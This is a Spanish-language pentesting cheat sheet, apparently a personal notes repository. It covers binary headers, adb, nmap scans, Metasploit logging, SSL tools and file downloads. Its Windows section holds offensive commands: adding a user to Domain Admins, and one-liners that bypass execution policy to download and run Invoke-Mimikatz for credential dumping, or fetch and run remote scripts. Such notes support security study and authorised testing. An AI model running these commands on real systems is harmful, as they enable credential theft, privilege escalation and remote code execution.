# Pentest
Un compendio de notas sobre pentest.

************************************************************************************************
# Análisis de binarios
## 32 bits vs 64 bits

Se abre el binario con un visor hexadecimal y se busca lo siguiente:

Si es de 32 bits
+ PL
+ 50 45 00 00 4C

Si es de 64 bits
+ PE..dt
+ 50 45 00 00 64 86

************************************************************************************************
# Android
## Herramientas utiles
+ Genymotion
+ Android Studio

## adb

Comandos útiles
```bash
# Mostrar menú de la herramienta
adb

# Listar dispositivos
adb devices

# Instalar en aplicación en emulador
adb -s <emulator> install <application.apk>

# Reemplaza la copia existente de la aplicación
adb -s <emulator> install -r <application.apk>

# Ingresa a una shell de un device
adb -s <emulator> shell

# Envía un documento a un emulador
adb -s <emulator> push '/home/user/local/file' '/data/local/' 

# Descarga un documento desde un emulador
adb -s pull 'sdcard/log.txt' '/home/user/local/file'

```

************************************************************************************************
# Envío de información
## Vía POST

**BASH**
```bash
curl --header "Content-Type: application/json" \
    --request POST \
    --data '{"username":"xyz","password":"xyz"}' \
    http://localhost:3000/
```

Más información
+ https://linuxize.com/post/curl-post-request/


## Vía GET
**BASH**
<!--
```bash
GET_USER="user"
GET_PASS="pass"
URL=""
curl https://reqbin.com/
```
-->

************************************************************************************************


************************************************************************************************
# Herramientas útiles
## Webhook
Para recibir emails y peticiones sin una IP pública
+ https://webhook.site

## Cyberchef
Un montón de herramientas para códificar/decodificar
+ https://gchq.github.io/CyberChef/

************************************************************************************************
# Metasploit
## Logs
Problema:
+ La salida de los comandos en metasploit nos es procesable con << |  >>
    + Por ejemplo la salida de enum_ssh para filtrar únicamente los usuarios validos

Con spool puedes definir un lugar en que se guardarán todo lo que imprima en pantalla metasploit

~~~~bash
# Apagar los logs
spool off

# Añadir una ruta en que se harán los logs
spool /ruta/para/guardar.log

# Si lo quieres tener por siempre 
spool /home/<username>/.msf3/logs/console.log
~~~~


************************************************************************************************
# nmap
## Secuencia

1. Corroborar que el host esté arriba, considerar omitir la resolución DNS
2. Detección única de puertos (Sin versiones ni nada)
3. Detección de versiones y vulnerabilidades 

## Descubrimiento rápido
~~~bash
# Escaneo a top ports
nmap --max-retries 0 --top-ports 5000 site.com 
# Escaneo a todos los puertos
nmap --max-retries 0 -p- site.com
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -P0 site.com 
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -Pn site.com 
~~~

## Detección de versiones y vulnerabilidades
~~~bash
# Sintaxis básica
nmap --max-retries -p 22,80,443,3000 -sV

# -sV => Mostrar versiones
# -O => Identifica S.O.
# -p => Define el puerto

# Identifica vulnerabilidades
nmap -sV -p80,443 --script=vulners ip

# Identifica vulnerabilidades por puerto asociado
nmap -p80,8080 –sV –sC ip
# -sC => Scripts de vulnerabilidades acorde al puerto analizado
~~~


************************************************************************************************
# Python
## Servidores web

~~~python
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 7777
~~~


************************************************************************************************
# SSL
## Herramientas

Desde la web
+ https://www.ssllabs.com/ssltest/analyze.html

ssl scan
+ https://github.com/rbsec/sslscan

testssl
+ https://github.com/drwetter/testssl.sh

Guía de cifrados seguros e inseguros
+ https://ciphersuite.info/cs/?security=all&software=openssl&singlepage=true

************************************************************************************************
# Linux
## Descargar archivos

**wget**

```bash
# Descarga un archivo
wget <URL>

# Descarga y renombra un archivo
wget -O <filename> <URL>

# Descarga varios archivos desde un archivo de texto con las urls
wget -i download_files.txt

# Descarga una carpeta
wget -r ftp://server-address.com/directory
```

**curl**

```bash
# Descarga un archivo
curl -O URL
curl -O URL1 URL2 URL3

# Descarga y renombra un archivo
curl -o filename URL
```

************************************************************************************************
# Windows
## Descargar archivos

**Requiere administrador**
~~~powershell
# Metodo 1 - Download in PowerShell 2 ^
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/elcaza/pentest/main/README.md","C:\path\file")

# Metodo 2 - Download with Invoke-WebRequest ^
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -OutFile "C:\path\file"

# Metodo 3 - Download with Invoke-WebRequest ^
wget "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -outfile "file"
~~~

Más información:
+ https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

## Añadir usuario a Dominio
~~~ powershell
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN
~~~ 

## Ejecutando un living off the land
+ Windows Defender lo detecta como actividad maliciosa

~~~powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
~~~

iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))

Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.100.59:3000/poc.ps1')


Más información
+ https://lolbas-project.github.io/
+ https://github.com/LOLBAS-Project/LOLBAS
+ https://www.elladodelmal.com/2020/09/windows-amsi-antimalware-scan-interface.html
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-network-connections-microsoft-defender-antivirus?view=o365-worldwide
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-exclusions?view=o365-worldwide
+ https://www.gb-advisors.com/es/mimikatz/#:~:text=Windows%20cuenta%20con%20la%20funcionalidad,la%20clave%20secreta%20para%20descifrarlas.

## Obteniendo datos del sistema

```cmd
REM REM = Comentario en CMD
REM Obtener información
systeminfo 

```